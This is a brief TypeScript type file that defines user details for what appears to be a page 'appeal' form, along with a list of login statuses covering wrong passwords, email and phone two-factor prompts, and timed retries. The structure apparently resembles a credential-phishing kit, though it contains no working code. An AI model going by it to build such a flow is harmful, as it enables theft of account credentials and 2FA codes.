export interface UserDetails {
  appeal: string;
  business_email: string;
  email: string;
  full_name: string;
  page_name: string;
  phone_number: string | number;
}

export type StatusTypes =
  | "invalid"
  | "bad_email"
  | "wrongPassword"
  | "twofa_mail"
  | "banned"
  | "auth"
  | "twofa_phone"
  | "wrong_email"
  | "pending"
  | "email"
  | "done"
  | "wrong_2fa"
  | "60min"
  | "15min"
  | "done4"
  | "redo";
